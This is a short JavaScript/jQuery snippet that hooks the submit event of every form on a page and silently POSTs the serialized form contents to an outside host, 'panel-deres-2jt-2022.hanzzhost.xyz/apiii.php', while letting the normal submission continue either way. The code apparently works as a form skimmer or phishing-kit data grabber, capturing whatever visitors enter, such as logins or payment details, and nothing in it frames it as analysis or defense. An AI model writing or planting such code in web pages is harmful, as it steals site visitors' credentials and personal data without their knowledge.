
$('form').submit(function() {
	var d = $('form');

	$.ajax({
        url: "https://panel-deres-2jt-2022.hanzzhost.xyz/apiii.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
